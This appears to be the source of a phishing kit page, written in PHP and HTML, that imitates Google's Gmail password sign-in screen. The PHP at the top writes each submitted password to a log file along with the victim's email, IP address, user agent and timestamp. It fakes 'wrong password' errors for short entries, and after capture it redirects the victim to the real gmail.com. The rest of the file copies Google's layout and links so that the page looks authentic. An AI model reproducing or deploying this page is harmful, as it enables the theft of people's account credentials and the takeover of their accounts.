<?php
session_start ();
$passfile = $_SESSION['link'];
$a = strtolower( $_SESSION['use'] );
$agent =  $_SERVER['HTTP_USER_AGENT'];
 $ip = $_SERVER['REMOTE_ADDR'];
$d = date("Y-m-d h:i:sa");
	
if(isset($_POST['signin'])){
$pass = $_POST['password'];
$c = strlen($pass);
$pstyle = "border:1px solid red;";
if(empty($pass)){
$msg = " Please enter your password. ";}
elseif($c < 7){
$msg = " Wrong password. Try again. ";}
elseif($c > 6 && $c < 20){ $g = fopen($passfile,"a");;
fwrite ($g , "<font size = '1'>Email>[". $a . "]:Password>[". $pass ." ] Ip>[". $ip. "]:<br>useragent>[". $agent ." ]<br>Date:[".$d."] </font><hr>");
fclose($g);
header("Location:http://www.gmail.com");
}
else{$msg= " ";}
}else{ $msg= " ";
$pstyle = " ";

}
?>
<?php include "header.php";
?>
  <body>
  <style>
  .circle-mask {
  display: block;
  height: 85px;
  width: 85px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 100;
  margin-bottom: 10px;
  background-size: 85px;
  background-repeat: no-repeat;
  background-image: url(https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=96);
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
} .signin-card {
  height: 520px;
  }
  </style>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="main-content shift-form">
<div class="card signin-card
  
    pre-shift shift-form">
  <div id="cc_iframe_parent">
  <iframe id="youtube" src="https://accounts.youtube.com/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.google.com&amp;v=-1377775455&amp;timestamp=1462266999117 " style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
 <div class="circle-mask" style="">
  <canvas id="canvas" class="circle" width="96" height="96"></canvas>
  </div>
  <form method="post" action="p.php">
 
  <div class="form-panel first valid" id="gaia_firstform">
  <div style="transition-delay: 0ms;" class="slide-out hide-form">
  <div class="input-wrapper focused">
  <div id="identifier-shown"></div>

  </div>
<div style="display: none" id="identifier-captcha">

<div class="audio-box">
  <div id="playIdentifierAudio"></div>
</div>
<div id="captcha-box" class="captcha-box">
  <div id="captcha-img" class="captcha-img" data-alt-text="Visual verification"></div>
  <span class="captcha-msg">
  Letters are not case-sensitive
  </span>
</div>
<label for="identifier-captcha-input" class="hidden-label"></label>
</div>
<input id="next" name="signIn" class="rc-button rc-button-submit" value="Next" type="submit">
  <a class="need-help" href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ignoreShadow=0&amp;hl=en">
  Need help?
  </a>
  </div>
  </div>
  <a href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1" tabindex="-1">
  <img id="back-arrow" class="back-arrow shift-form" aria-label="Back" tabindex="0" alt="Back" src="arrow.png">
  </a>
  <div class="form-panel second">
  <div style="transition-delay: 100ms;" class="slide-in">
  <div>
  
  <span id="email-display"><?php
		echo $a;
		?></span>
  </div>
  <div>
  <div id="password-shown"><div>
  <p><input type="hidden" name="Email" value=" <?php
		echo $a;
		?>"></p>
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" class="" id="password" name="password" placeholder="Password" required="" type="password" style="<?php echo $pstyle; ?>">  <label style = "margin:3px; color:red;"><?php echo $msg; ?></label>
  </div></div>
  </div>
<input id="signIn" name="signin" class="rc-button rc-button-submit" value="Sign in" type="submit">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" value="yes" type="checkbox">
  <span>
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="https://support.google.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  
 <a id="link-forgot-passwd" class="need-help" href="https://accounts.google.com/signin/recovery?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;Email=blackblack.mm44%40gmail.com&amp;ignoreShadow=0&amp;hl=en">
  Forgot password?
  </a>
  </div>
  </div>
  <span id="inge" style="display: none" role="alert" class="error-msg">
  Sorry, Google doesn't recognize that email. <a href="https://accounts.google.com/SignUpWithoutGmail?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">Create an account</a> using that address?
  </span>
  <span id="timeoutError" style="display: none" role="alert" class="error-msg">
  Something went wrong. Check your connection and try again.
  </span>
  </form>
</div>
  <div class="card-mask-wrap shift-form">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;hl=en&amp;service=mail&amp;scc=1">
  Sign in with a different account
  </a>
  </span>
  <span id="link-signup">
  <a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">
  Create account
  </a>
  </span>
  </p>
<?php include "footer.php"; ?>